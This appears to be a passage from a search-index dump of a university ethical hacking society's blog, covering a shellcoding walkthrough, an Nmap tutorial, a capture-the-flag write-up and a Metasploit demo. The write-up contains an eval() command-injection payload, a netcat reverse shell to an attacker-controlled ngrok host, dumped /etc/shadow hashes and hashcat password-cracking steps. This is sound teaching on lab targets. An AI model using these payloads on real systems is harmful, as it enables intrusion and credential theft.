ptr [rip+evil+1] inc byte ptr [rip+evil] evil: .byte 0x0e .byte 0x04 mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 inc byte ptr [rip+evil+1] inc byte ptr [rip+evil] evil: .byte 0x0e .byte 0x04 flag: .string \"flag\" \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x1000 bytes from stdin.\\n\")) p.sendline(shellcode) print_clean(p.readrepeat()) Here’s the solution already implemented in ‘boilerplate.py’ ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:4:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Conclusion We hope this explanation on how to solve the three challenges was helpful (and not too verbose!). If something is still obscure to you, you can ask a question on the discord server or comment below and we will try to answer in a timely manner. ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:5:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"A whole month of cybersecurity talks","date":"2021-10-05","objectID":"/posts/octalkber/","tags":["welcome"],"title":"Octalkber","uri":"/posts/octalkber/"},{"categories":["Academic Year 2021-22"],"content":"Throughout the month of October, for cybersecurity awareness month, each week we will be having a talk by someone in the cybersecurity field. To see our latest line-up and how to gain access to these talks; please refer to the posts in Aula and the ComSec Discord channel. Thanks, ComSec ","date":"2021-10-05","objectID":"/posts/octalkber/:0:0","tags":["welcome"],"title":"Octalkber","uri":"/posts/octalkber/"},{"categories":["Academic Year 2021-22"],"content":"A brief introduction to scanning tools and techniques, ending the session with a boot2root challenge","date":"2021-09-29","objectID":"/posts/2021_scanning/","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"In this session we will begin to look at scanning and enummeration, and start to look at some of the associated tools. ","date":"2021-09-29","objectID":"/posts/2021_scanning/:0:0","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Warm Up - Getting help in the Terminal Ever forgotten a command or switch in linux - here’s two great ways to find help; all from the comfort of your terminal! ","date":"2021-09-29","objectID":"/posts/2021_scanning/:1:0","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"–help Virtually all commands in linux have built-in help, all you need to do is append --help to the end of your command. So for help with nmap, you would use nmap --help Now this can produce a lot of text output, so you may wish to add the grep command to filter the output. So for example, I wish to find out how to detect an operating system in a nmap scan nmap --help | grep \"OS \" ","date":"2021-09-29","objectID":"/posts/2021_scanning/:1:1","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Man Pages Man pages, short for manual, is a well manual for a specific command - to use it just type man \u003ccommand\u003e. This will generally display more information the –help. For example, to view the manual for nmap, type: man nmap To search the file press ‘/’ and then enter your search term. ","date":"2021-09-29","objectID":"/posts/2021_scanning/:1:2","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Scanning Scanning is an essential tool in ethical hacking, and great for intelligence gathering. Allows us to gain an ‘image’ of what is happening. There are multiple types of scanning – Directory, Vulnerability, Network, Port, etc. This week we will focus of network and port scanning using Nmap (but please note there are alternatives). ","date":"2021-09-29","objectID":"/posts/2021_scanning/:2:0","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Legal Scanning is seen as a form of an attack (as there are no other reasons why you would scan a device). This means that if you scan a device you do not have written or prior permission to use you could be convicted under the Computer Misuse Act 1990. Advice: Only scan IPs that you have prior written permission to scan. Only scan private IP’s as defined in RFC 1918. When using a VM use host-only networking - as this will prevent you from scanning external IPs. ","date":"2021-09-29","objectID":"/posts/2021_scanning/:2:1","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Networks and Why Scan? A network is a group of interconnected computers, which are assigned an IP address. The whole point of scanning a network is to discover which IP addresses are in use across the network (so we can target them in the port scanning phase). There are a few ways to go about this, each with pro’s and con’s: Wire-tap Can be done by plugging a device into the network, or the functionality can be emulated by software like wireshark Records each packet that passes it Main advantage to this method it is quiet, hence useful for red teaming situations Main disadvantage is that it can be slower and miss devices ARP Scan The Address Resolution Protocol is used to find the MAC address of a computer on a local subnet Main advantage of ARP is that it cannot be disabled in IPv4 and you can find out the manufacturer of each device Main disadvantage is that you can only find devices on your local subnet Ping Sweep This sends an ICMP request to every device on the network If there is a response, a machine is at that address As it is a layer 3 protocol, it can reach devices on other subnets (hence finding more) Main disadvantage is that more and more devices will not respond to ping requests (so that they will not be discovered), for example this behaviour is blocked by default in Windows 10. ","date":"2021-09-29","objectID":"/posts/2021_scanning/:2:2","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Ports and Why Scan? Ports are used to separate network traffic between different - applications. There are two types of ports TCP \u0026 UDP There are 65535 \u0026 standards define what they normally do: 0 – 1023 Well Known 1024 – 49151 Assigned Ports 49152 + Dynamic Ports You can find ports that are open (and not blocked by the firewall) You can attempt to determine the software/application running that port and research associated vulnerabilities You can try to discover the hosts operating system Types of Scan TCP Stealth Scan - sudo nmap –sS {ip} TCP Connect Scan - nmap –sT {ip} Ping Sweep - nmap –sn {ip} UDP Scan - sudo nmap –sU {ip} ARP Scan - arp-scan {ip-network} ","date":"2021-09-29","objectID":"/posts/2021_scanning/:2:3","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Challenge Head to CTFd for this week’s challenge and complete the Scanning and Enumeration section. Write-Up To view the write-up for this week’s challenge, please refer to the Nmap 2 challenge, on this post ","date":"2021-09-29","objectID":"/posts/2021_scanning/:3:0","tags":["Nmap","CTF","Docker","enumeration","reconnaissance"],"title":"Scanning and Enumeration","uri":"/posts/2021_scanning/"},{"categories":["Academic Year 2021-22"],"content":"Intro The first-week challenge covers the basics of OSINT research, opening remote connections and password cracking. I will try to cover most of the methods we can use to get through Jack’s cat and Ben’s secure passwords. Without further ado, let’s begin. ","date":"2021-09-28","objectID":"/posts/week1_writeup/:1:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 1: Web Username The first one was very tricky for me as I am not a cat person and don’t enjoy cat pictures… Anyway, as we go to the landing page, we can see that there are home(1) and login(2) pages and some information(3) about some employees. As the challenge is OSINT related, we can try to find some accounts or any information on the internet related to these people. After a little bit of googling, I managed to find Dixon’s Twitter account. Following the chronology and the contest of the tweets, we can see that Dixon has started working for Insanity Accounting a while after he created his account. From one of the tweets, we can see a picture of his cat… and the username we were looking for on peace of paper under the cat…… ","date":"2021-09-28","objectID":"/posts/week1_writeup/:2:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 2: Web Hashed Password The second challenge is more obvious. If we take a look over this tweet, we can see that Dixon messed up something and decided to share a link with us. The link will take us to deleted tweet, but that doesn’t mean we can’t see it. By using WayBack we can see the content of the tweet. And we got our second flag. ","date":"2021-09-28","objectID":"/posts/week1_writeup/:3:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 3: What is Dixson’s password? For challenge 3, we are given a new hash as the one from challenge 2 is incorrect. To crack the hash we can use either hashcat, johnny, CrackStation, Cain\u0026Abel, etc. As hashcat is the best password brute force tool, in my opinion, I will use it, but CrackStation will do just fine for this password. ❯ hashid '9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd' -m Analyzing '9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd' [+] Snefru-256 [+] SHA-256 [Hashcat Mode: 1400] [+] RIPEMD-256 [+] Haval-256 [+] GOST R 34.11-94 [Hashcat Mode: 6900] [+] GOST CryptoPro S-Box [+] SHA3-256 [Hashcat Mode: 5000] [+] Skein-256 [+] Skein-512(256) ❯ hashcat -m 1400 -a 0 '9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd' rockyou.txt Result: 9a900403ac313ba27a1bc81f0932652b8020dac92c234d98fa0b06bf0040ecfd:qwertyuiop ","date":"2021-09-28","objectID":"/posts/week1_writeup/:4:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 4: User Flag Great! We have credentials. Username: D.Varley772 Password: qwertyuiop Now we can try logging in. Sweet! eval() = free shell. By running the following code, we can execute commands on the target machine: eval('__import__(\"subprocess\").getoutput(\"\u003cCOMMAND\u003e\")'). We can get the flag by running eval('__import__(\"subprocess\").getoutput(\"cat /home/intern/user.txt\")'), but it would be more interesting if we get bind or reverse shell. There are many different ways of opening any of these shells, but as the system has nc, I will go with it. So, I will use reverse shell using ngrok to bypass my home router firewall and to keep my public IP private and pwncat for more stable shell. ","date":"2021-09-28","objectID":"/posts/week1_writeup/:5:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"On our machine ngrok tcp 4444 pwncat -l 0.0.0.0 4444 --self-inject /bin.bash:\u003cNGINX_IP\u003e:\u003cNGINX_PORT\u003e ","date":"2021-09-28","objectID":"/posts/week1_writeup/:5:1","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"On the victim’s machine eval('__import__(\"subprocess\").getoutput(\"nc \u003cNGROK_IP\u003e \u003cNGROK_PORT\u003e -e /bin/bash\")') And voila! We have a shell. Even if the shell gets closed for some reason (internet drops, we press Ctl-C by accident, etc.), the only thing we need to do is to open a new listener (pwncat -l 0.0.0.0 4444), and we will get connected. The only thing left is to get the user flag. cat /home/intern/user.txt ","date":"2021-09-28","objectID":"/posts/week1_writeup/:5:2","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Challenge 5: Root Flag Now, on the root flag! No further enumeration is required than cat /etc/shadow. root:$6$czitf7EkuZDKvo1G$Fzuxy.As6BxQhNyUV0zq9z0ehkb3yhzSAOFekJ1jpf.J3/3wJ.v.ARwzq28tQp2XEI81tl.hb6bWWY29JLxnX0:18891:0:99999:7::: daemon:*:18799:0:99999:7::: bin:*:18799:0:99999:7::: sys:*:18799:0:99999:7::: sync:*:18799:0:99999:7::: games:*:18799:0:99999:7::: man:*:18799:0:99999:7::: lp:*:18799:0:99999:7::: mail:*:18799:0:99999:7::: news:*:18799:0:99999:7::: uucp:*:18799:0:99999:7::: proxy:*:18799:0:99999:7::: www-data:*:18799:0:99999:7::: backup:*:18799:0:99999:7::: list:*:18799:0:99999:7::: irc:*:18799:0:99999:7::: gnats:*:18799:0:99999:7::: nobody:*:18799:0:99999:7::: _apt:*:18799:0:99999:7::: intern:$6$xZ.biffGBU0sIYTq$zR7sXPuF/RgvqHdL/Hx33N0/z34pEb008DZnRUrkz/9rZfkY7Cu/tbObJYm0DnHTkMnwtcN/mELCLTJKz0ua50:18891:::::: Great! We have hashed. Now, we can try some brute-forcing. However, this would get us nowhere unless we pay attention to the notes left in the /home/intern/ directory. Efforts to get the boss to give me the credentials for root on this machine haven't been going well. Luckily I have a pretty good idea of what it could be so I can start guessing it. Here is what I know - I know my boss set the password - He has a cat called Collin - He has a daughter called Holly - The password he set for Splunk was h0lly_2001 Now we can use this info and hashcat rules to crack the password. So, if we already have one password we can use it as a template. Let’s begin with the names. We can put them into a wordlist. ❯ cat \u003c EOF \u003e names.list \u003e Collin \u003e collin \u003e Holly \u003e holly \u003e EOF Now we can use a little bit of hashcat-fu and generate a new wordlist from our names. For this purpose, we can use rules. If you are not familiar with hashcat rules, check out their documentation The rules I am going to use to generate the new wordlist are pretty much going to replace symbols like “s” with “$”, “a” with “4”, and so on. That is the content of the file I am going to use: : l u sa4 sa@ sb6 sc\u003c sc{ se3 sg9 si1 si! sl1 so0 sq9 ss5 ss$ st7 st+ sx% sa@sc\u003cse3sl1si1so0ss$ lsa@sc\u003cse3sl1si1so0ss$ usa@sC\u003csE3sL1sI1sO0sS$ sa@sc\u003cse3sl1so0ss$ lsa@sc\u003cse3sl1so0ss$ usa@sC\u003csE3sL1sO0sS$ sa@sc\u003cse3si1so0ss$ lsa@sc\u003cse3si1so0ss$ usa@sC\u003csE3sI1sO0sS$ The command to generate it is: hashcat -r rules names.list --stdout \u003e wordlist.list And once we have generated our new wordlist, we can try brute-forcing the password with a mask attack that is going to look like this: hashcat -m 1800 -a 6 hash.txt wordlist.list ?1?2?3?d?d -1 _- -2 12 -3 90 This mask will append - or _ to the end of each word with folowing all the ears from 1900 to 2099. After less then a second we will have our result. Result: $6$czitf7EkuZDKvo1G$Fzuxy.As6BxQhNyUV0zq9z0ehkb3yhzSAOFekJ1jpf.J3/3wJ.v.ARwzq28tQp2XEI81tl.hb6bWWY29JLxnX0:C0ll1n_1989 Now we just need the root flag. Bare in mind that to be able to gain live shell (TTY), you need to run: /usr/bin/script -qc /bin/bash /dev/null. From there: su root cat /root/you_rooted_me.txt ","date":"2021-09-28","objectID":"/posts/week1_writeup/:6:0","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"Hope you have learned something new 😄🐈‍⬛ ","date":"2021-09-28","objectID":"/posts/week1_writeup/:6:1","tags":["OSINT"," nc","pwncat","metasploit","hashcat","ngrok"],"title":"Week 1: OSINT Chalange Writeup","uri":"/posts/week1_writeup/"},{"categories":["Academic Year 2021-22"],"content":"A quick introduction to ComSec, then jumping into a boot2root CTF machine!","date":"2021-09-22","objectID":"/posts/2021_taster_session/","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Welcome back to our first official session for the new academic year, it was great to finally meet you all in real life. This is a quick recap of what we did. ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:0:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"What is ComSec? Welcome to ComSec, we are Coventry University’s Ethical Hacking Society. We aim to share our knowledge around cybersecurity and to create a strong info-sec community. Our aims: Teach cybersecurity Organise talks with businesses Organise university wide competitions Compete internationally with our team ‘Ethical Slackers ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:1:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Committee 2021 This year the committee is: Ben R (second year) Jack Orcherton (third year) Martin Schon (placement year) Tiago Pascoal (third year) ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:2:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Legal \u0026 Rules We teach ethical hacking in the faith that you will only use it for ethical purposes and will abide by the Computer Misuse Act 1990 and all other related laws. We are not lawyers and do not accept any responsibilities for your actions! If you are ever unsure whether an action is illegal; do not do it - as sadly it’s impossible to CTRL + Z hacking. Additionally, as an inclusive society, we are committed to enforcing our Code of Conduct. ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:3:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Getting Involved To join the society, you do not require any membership and can just turn up to our sessions. Do not worry about attending every session, but note we typically pick the most active people to compete in external competitions. ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:4:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Quick Advice What is the best way to improve? Practice! Below are some great sites: HackTheBox TryHackMe VulnHub Keeping up with the latest cybersecurity news. All InfoSec News is nice as it aggregates news stories from multiple sources. ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:5:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"Today’s Challenge Today we will be completing a boot2root machine, kindly put together by Ben and Jack. It is hosted on CTFd – remember when signing up, use your university address! Today’s challenge – mainly based on reconnaissance. The more you know, the easier it will be! Note Please be respectful of the other CTF players. If you have system access think about what you are doing. Don’t ruin the experience for other players by modifying/deleting files or leaving clues in easy to find places We hope to include a write-up for the challenge in the upcoming days. ","date":"2021-09-22","objectID":"/posts/2021_taster_session/:6:0","tags":["welcome","CTF","OSINT","web","Web Shells","nc"],"title":"Introduction, Recon \u0026 OSINT Taster Session","uri":"/posts/2021_taster_session/"},{"categories":["Academic Year 2021-22"],"content":"An introduction to ComSec and our plans for 2021","date":"2021-09-10","objectID":"/posts/welcome_2021/","tags":["welcome"],"title":"We're Back!","uri":"/posts/welcome_2021/"},{"categories":["Academic Year 2021-22"],"content":"Welcome to a new year at ComSec — Coventry University’s unofficial ethical hacking society. We are proud to announce due to the relaxation of COVID-19 rules, we will be holding in-person events every week on Wednesday at 2pm. Also, if the interest is there; we will offer a live-streamed version available on our Discord channel (please let the committee know prior to the session). We would also, like to take this opportunity to formally welcome our latest committee member, Ben! ","date":"2021-09-10","objectID":"/posts/welcome_2021/:0:0","tags":["welcome"],"title":"We're Back!","uri":"/posts/welcome_2021/"},{"categories":["Academic Year 2021-22"],"content":"What is ComSec? As a society, our main aims are to: Learn \u0026 practise new cybersecurity/ethical hacking skills Organise and compete CTF competitions on an international stage (we do this under the team name ethical slackers and have previously taken part in RuCTFe among others) Create a warm and welcoming environment which is beginner and pro friendly and to share our skills from people across the University. Hold conversations and meet-ups with people and businesses associated with Ethical Hacking and Cybersecurity To create a warm and welcoming environment; we follow and uphold a code of conduct ","date":"2021-09-10","objectID":"/posts/welcome_2021/:1:0","tags":["welcome"],"title":"We're Back!","uri":"/posts/welcome_2021/"},{"categories":["Academic Year 2021-22"],"content":"Taster Session See what ComSec has to offer and join us in our first session on Wednesday 15th September at 2pm. If you have any questions; drop us an email by searching for ComSec in your university email contacts! ","date":"2021-09-10","objectID":"/posts/welcome_2021/:2:0","tags":["welcome"],"title":"We're Back!","uri":"/posts/welcome_2021/"},{"categories":null,"content":"How to contribute and add your own posts to this site!","date":"2021-05-28","objectID":"/posts/contributing/","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"If you are a member of ComSec, we would love you to contribute to our site; and as a reward we will display your name as the article’s author. The type of articles we would like is anything hacking related; this could be from discussing a topic to a walkthrough to a CTF challenge. ","date":"2021-05-28","objectID":"/posts/contributing/:0:0","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Getting Started Firstly you will need to fork this repository. This can be done through GitHub by visiting our repository and by clicking fork in the top right corner. NB: you must be logged into GitHub to do this! Now that you have forked the repository, you will need to use the following commands to download the repository and the related git submodules: git clone --recursive https://github.com/\u003cyour GitHub username\u003e/\u003cyour forked repo name\u003e ","date":"2021-05-28","objectID":"/posts/contributing/:1:0","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Installing Hugo The website uses the Hugo engine to build the markdown pages into a website, although this step is not required, as the website is compiled by a GitHub Action. To view it locally run: hugo serve The website should then be hosted locally on port 1313. ","date":"2021-05-28","objectID":"/posts/contributing/:2:0","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Creating Posts To create a post, firstly head into the posts folder. Now create a new folder. NB: this is used to generate the posts URL, so please ensure that it is short, descriptive and contains no spaces and/or special characters. Once the folder is created, enter it and create a file named ‘index.md’ - this will be where you write your text. ","date":"2021-05-28","objectID":"/posts/contributing/:3:0","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Storing Files If you wish to add files (such as images, pdf files, etc.) please place them in this folder. Again please call them a sensible name as it will be used to generate the URL. ","date":"2021-05-28","objectID":"/posts/contributing/:3:1","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Writing Posts Now that we have sorted all the necessary files, we can begin writing posts - so now open index.md in your favourite text/markdown editor. Front Matter To set up the blog post, you must use front matter to set the settings, you must add the following, modifying the values to suit. --- title: \"Add Post Title \" date: 2021-05-07T14:50:28+01:00 draft: false description: \"describe your article\" tags: [\"tag1\", \"tag2\", \"etc. \"] categories: [\"Big Category \"] author: \"Your Name/alias\" authorLink: \"https://example.com\" --- Write Content After you have added the front matter, and added the three dashes, you can write your content using standard markdown. If you are new to markdown, I recommend that you read this guide and look at other posts on this website to get an idea. Adding Images/Linking Files To add a photo that you have placed in the same folder as above use: ![\u003cadd alternate text\u003e](imageName.png) To add a file, you must add a hyperlink - this is done by: [text to display](filename.extension) ","date":"2021-05-28","objectID":"/posts/contributing/:3:2","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Save Changes Once you are happy, you must commit and upload your work to the GitHub server: git add * git commit -am \"meaningful commit message\" git push ","date":"2021-05-28","objectID":"/posts/contributing/:4:0","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":null,"content":"Pull Request You now need to raise a pull request to ask for permission to merge with our site - here one of the committee will read your post and hopefully approve it! ","date":"2021-05-28","objectID":"/posts/contributing/:4:1","tags":["welcome","contributing"],"title":"How to Contribute","uri":"/posts/contributing/"},{"categories":["Academic Year 2020-21"],"content":"Today, we will have a talk from cybersecurity business Nettitude. Topics that will be covered will be what the industry is like and their graduate/internship schemes. You will be able to talk to graduate students and their experiences, and the event will be rounded up with a CTF competition! To find out more about Nettitude click here. ","date":"2021-03-17","objectID":"/posts/nettitude/:0:0","tags":["guest"],"title":"Nettitude Event","uri":"/posts/nettitude/"},{"categories":["Academic Year 2020-21"],"content":"Today, we will be having a talk by cybersecurity business Bulletproof. The talk will include topics like what it is like to work in the security industry and the many different areas. Additionally, you will be able to talk to graduate students and have a chance to ask questions. Finally, the event will be capped off with a CTF! We would like to thank Bulletproof for holding the event, click here to find more about them. ","date":"2021-02-24","objectID":"/posts/bulletproof/:0:0","tags":["guest"],"title":"Bulletproof Event","uri":"/posts/bulletproof/"},{"categories":["Academic Year 2020-21"],"content":"Update To view a recording of the event, please click here (Coventry University Students only). ","date":"2021-02-24","objectID":"/posts/bulletproof/:1:0","tags":["guest"],"title":"Bulletproof Event","uri":"/posts/bulletproof/"},{"categories":["Academic Year 2020-21"],"content":"This week we will discuss solutions to the 12 days of Christmas CTF that we created. Not had a go - look at CTFd to take part! Before starting this week, we would like to announce the winners: 1st ¯_(ツ)_/¯ 3230pts 2nd NotSuspicious 1730pts 3rd Jeff 1040pts Best Write-up - Ben We would also like to thank everyone who took part, and we hoped that you enjoyed the challenges. ","date":"2021-02-03","objectID":"/posts/12days_xmas_ctf_review/:0:0","tags":["CTF"],"title":"12 Days of Christmas CTF Review","uri":"/posts/12days_xmas_ctf_review/"},{"categories":["Academic Year 2020-21"],"content":"Format Today we plan to let you pick the challenges you struggled with, and the person who created it will walk you through the intended solution. Info As this session was done live and to avoid spoilers, we have not posted solutions. ","date":"2021-02-03","objectID":"/posts/12days_xmas_ctf_review/:1:0","tags":["CTF"],"title":"12 Days of Christmas CTF Review","uri":"/posts/12days_xmas_ctf_review/"},{"categories":["Academic Year 2020-21"],"content":"Today, we will look at Metasploit; a widely used pen testing framework. Metasploit is a massive product and today we will focus on: What is Metasploit? What is msfconsole? What is Metasploitable2? Using Nmap in msfconsole Running an exploit using Metasploit ","date":"2021-01-27","objectID":"/posts/metasploit/:0:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Resources Presentation Slides Tip In the examples, I run exploits against Metasploitable 2 (a deliberately vulnerable VM). You can download it here. ","date":"2021-01-27","objectID":"/posts/metasploit/:0:1","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"What is Metasploit? Metasploit is the world’s most used penetration testing framework made by Rapid7. It is installed by default on Kali Linux and has many different features/modes aimed at different areas (like msfvenom) but today we will be focusing on msfconsole. The pro version is even better (but sadly priced outside a student’s budget). ","date":"2021-01-27","objectID":"/posts/metasploit/:1:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"msfconsole Msfconsole is the main command used to access the majority of Metasploit. Msfconsole is split into six core modules: Exploit – holds exploitation scripts. Payload – holds shellcodes/other scripts handy after exploitation. Auxiliary – mainly for scanning/checking a machine is vulnerable to an exploit. Post – used after exploitation for privilege escalation/pivoting/maintaining access. Encoder – used to hide payloads to avoid antivirus signature detection. NOP – used for buffer overflow and ROP chain attacks. Note NB: not every module is installed by default – use load \u003cmodule\u003e. ","date":"2021-01-27","objectID":"/posts/metasploit/:2:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Metasploitable 2 Metasploitable 2 is a virtual machine made by Rapid7 (creators of Metasploit). It is deliberately vulnerable and is used as a training resource. Metasploitable is also packed full of other training programs like DVWA, which is a great way to practice website exploitation. ","date":"2021-01-27","objectID":"/posts/metasploit/:3:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Demo I will now demonstrate how to use Metasploit by targeting the Metasploitable VM - so launch it as well as Kali. Starting Metasploit To start Metasploit use the following: msfdb init msfconsole Remember if you get stuck you can type ? at any time. Port Scanning Let’s discover what services are running on the Metasploitable machine. We will do this by scanning it with Nmap in msfconsole. To do this you must use db_nmap - then you can use all the usual Nmap flags. db_nmap -sV -vv machineIP Let’s start with the top service, FTP. Searching Now we have identified a service, let’s use the search command to find an associated exploit. search vsftpd As there is only one exploit, let’s select it and view the documentation. use 0 view Setting Up and Running Exploits Now we have viewed the documentation, we must set the following variables: RHOST - this sets the IP address of the target RPORT - this sets the port for the target (this only needs to be changed if the FTP server is running on a non-standard port). So, let’s now set the variables and launch the exploit: set RHOSTS machineIP run You should now receive a remote shell - congratulations you have just carried out your first exploit through Metasploit. ","date":"2021-01-27","objectID":"/posts/metasploit/:3:1","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Challenge This week, we have only looked at the scanning \u0026 exploitation process - next week we will look at post exploitation. But for today, return to the Nmap scan and pick a different port and try to gain access. ","date":"2021-01-27","objectID":"/posts/metasploit/:4:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Further Challenges Have a go at completing the Metasploit room on TryHackMe. ","date":"2021-01-27","objectID":"/posts/metasploit/:5:0","tags":["Metasploit"," msfconsole","Metasploitable2"],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["Academic Year 2020-21"],"content":"Dear Loyal Subjects, The Three Kings have received a prophecy about the birth of God’s son in twelve days’ time! Unfortunately, King Herald has also heard this news and has ordered the death of all babies within his kingdom. Since King Herald has many spies, we have had to enclose hidden information within this letter. Can you help the three Kings reach God’s son and ensure his safety? To do this, each day there will be three daily challenges to complete for the next 12 days (starting 26th December) with varying difficulties aimed at a range of abilities. As a reward for your help, we will offer the following prizes: 1st Place - 4 months of TryHackMe premium (one month per person for teams of 4) and swag, courtesy of CrowdStrike 2nd Place - 3 months HTB premium subscription, courtesy of the Institute of Code. 3rd Place – 1 month HTB premium subscription courtesy of HTB. Best Write-up - Udemy course on Linux Privilege Escalation for OSCP \u0026 Beyond! And Windows Privilege 